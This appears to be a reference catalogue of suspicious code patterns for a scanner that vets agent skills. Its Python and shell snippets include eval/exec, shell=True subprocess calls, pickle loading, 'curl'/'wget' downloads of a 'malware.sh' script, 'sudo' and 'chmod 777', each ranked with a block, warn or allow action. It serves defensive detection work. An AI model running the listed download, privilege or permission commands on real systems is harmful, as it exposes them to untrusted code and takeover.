# Malicious Patterns Reference

This document catalogs common malicious patterns that may indicate security risks in skills.

## Code Injection Patterns

### eval() and exec()
```python
eval(user_input)          # CRITICAL: Arbitrary code execution
exec(malicious_code)      # CRITICAL: Arbitrary code execution
compile(source, ..., 'exec')  # HIGH: Code compilation
```

### Dynamic Imports
```python
__import__(module_name)   # MEDIUM: Dynamic module loading
importlib.import_module() # MEDIUM: Dynamic module loading
```

## Command Execution Patterns

### Subprocess with Shell
```python
subprocess.call(cmd, shell=True)   # HIGH: Command injection
subprocess.run(cmd, shell=True)    # HIGH: Command injection
subprocess.Popen(cmd, shell=True)  # HIGH: Command injection
```

### OS System Calls
```python
os.system(command)       # HIGH: Direct command execution
os.popen(command)        # HIGH: Command execution with output
commands.getoutput()     # HIGH: Legacy command execution
```

## Credential Exposure Patterns

### Hardcoded Secrets
```python
password = "secret123"   # CRITICAL: Hardcoded password
api_key = "sk-xxxx"      # CRITICAL: Hardcoded API key
token = "bearer_xxx"     # CRITICAL: Hardcoded token
secret = "my_secret"     # CRITICAL: Hardcoded secret
```

### Environment Variables
```python
os.environ.get('PASSWORD')  # MEDIUM: May log credentials
```

## Network Communication Patterns

### HTTP Requests
```python
requests.get(url)        # MEDIUM: External communication
requests.post(url, data) # MEDIUM: Data exfiltration risk
urllib.request.urlopen() # MEDIUM: URL access
socket.connect()         # MEDIUM: Raw socket connection
```

### Download Commands
```python
curl http://example.com/malware.sh  # HIGH: Remote download
wget http://example.com/script.sh   # HIGH: Remote download
```

## File Operations Patterns

### Destructive Operations
```python
shutil.rmtree(path)      # MEDIUM: Directory deletion
os.remove(file)          # MEDIUM: File deletion
os.unlink(file)          # MEDIUM: File deletion
```

### File Modification
```python
open(file, 'w')          # LOW: File write
open(file, 'a')          # LOW: File append
```

## Deserialization Patterns

### Pickle Deserialization
```python
pickle.loads(data)       # HIGH: Arbitrary code execution
pickle.load(file)        # HIGH: Arbitrary code execution
```

### Other Deserialization
```python
marshal.loads(data)      # MEDIUM: Code execution risk
yaml.load(data)          # MEDIUM: Unsafe YAML loading (use yaml.safe_load)
```

## Obfuscation Patterns

### Base64 Encoding
```python
base64.b64decode(data)   # LOW: Potential obfuscation
base64.decode(data)      # LOW: Potential obfuscation
```

### Encoding Schemes
```python
codecs.decode(data, 'hex')  # LOW: Encoding/decoding
bytes.fromhex(hex_string)   # LOW: Hex decoding
```

## Privilege Escalation Patterns

### Sudo/Su Commands
```python
os.system('sudo ...')    # HIGH: Privilege escalation
subprocess.run(['sudo', ...])  # HIGH: Privilege escalation
```

### Permission Changes
```python
os.chmod(file, 0o777)    # MEDIUM: Insecure permissions
chmod 777 file           # MEDIUM: Insecure permissions
```

## Risk Level Classification

| Level | Description | Action |
|-------|-------------|--------|
| CRITICAL | Immediate security threat | BLOCK |
| HIGH | Significant security risk | BLOCK |
| MEDIUM | Moderate security concern | WARN |
| LOW | Minor security consideration | ALLOW with logging |
| SAFE | No security concerns detected | ALLOW |

## False Positive Considerations

Some patterns may be legitimate in certain contexts:

1. **eval/exec in testing**: May be used in test frameworks
2. **subprocess with shell=True**: Sometimes necessary for shell features
3. **Network requests**: Legitimate API calls
4. **File operations**: Normal file handling

Always consider context when evaluating threats.
